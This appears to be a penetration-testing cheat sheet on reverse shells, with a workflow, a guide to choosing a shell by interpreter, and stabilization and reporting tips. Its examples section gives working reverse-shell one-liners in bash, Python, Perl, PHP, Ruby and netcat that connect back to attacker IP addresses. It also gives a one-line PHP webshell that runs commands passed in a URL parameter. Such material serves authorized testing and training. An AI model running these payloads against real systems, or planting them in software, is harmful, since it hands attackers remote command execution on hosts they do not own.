# Shells

## Why It Matters

Shell one-liners are useful only when they match the environment you already control. The core job is:

- identify which interpreters exist
- choose the smallest working reverse shell
- upgrade the shell if needed

## Workflow

1. confirm available interpreters or binaries
2. choose a matching shell style
3. set up the listener first
4. execute the one-liner
5. stabilize the shell if possible

## Selection Guide

Use:

- `bash` if `/bin/bash` and `/dev/tcp` work
- `python` if Python is installed and you want a cleaner PTY path
- `perl`, `php`, or `ruby` if those runtimes are present
- `nc` only when the target version supports the needed features or FIFO tricks

## Examples

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.29",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Webshell Reminder

Simple PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

That is useful when reverse shells are blocked or unstable.

## Shell Stabilization

Once connected, try to improve usability:

- spawn a PTY
- set `TERM`
- background and reattach cleanly where possible

Python-based shells are often easiest to stabilize.

## Pitfalls

- firing random one-liners without checking installed runtimes
- forgetting the listener
- using a reverse shell when a webshell or command execution primitive is enough

## Reporting Notes

Shell payloads are usually operator tools, not report items. The report item is the vulnerability that allowed command execution.

## Fast Checklist

```text
1. Identify available runtimes
2. Start the listener
3. Pick the simplest matching one-liner
4. Trigger and validate the shell
5. Upgrade it if needed
```
